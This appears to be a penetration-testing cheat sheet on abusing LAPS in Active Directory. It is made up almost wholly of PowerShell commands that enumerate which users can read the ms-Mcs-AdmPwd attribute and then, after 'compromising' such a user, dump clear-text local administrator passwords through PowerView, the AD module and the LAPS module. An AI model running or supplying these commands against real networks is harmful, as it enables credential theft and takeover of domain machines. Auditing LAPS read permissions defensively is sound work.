# LAPS

#### Find users who can read the passwords in clear text machines in OUs

```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

#### Enumerate OUs where LAPS is in use along with users who can read the passwords in clear text

```
# Using Active Directory module
.\Get-LapsPermissions.ps1

# Using LAPS module (can be copied across machines)
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

#### Compromise the user which has the Rights, use the following to read clear-text password

{% tabs %}
{% tab title="Powerview" %}
```
Get-DomainObject -Identity <identity> | select - ExpandProperty ms-mcs-admpwd
```
{% endtab %}

{% tab title="AD Module" %}
```
Get-ADComputer -Identity <identity> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```
{% endtab %}

{% tab title="LAPS module" %}
```
Get-AdmPwdPassword -ComputerName <computrt-name>
```
{% endtab %}
{% endtabs %}
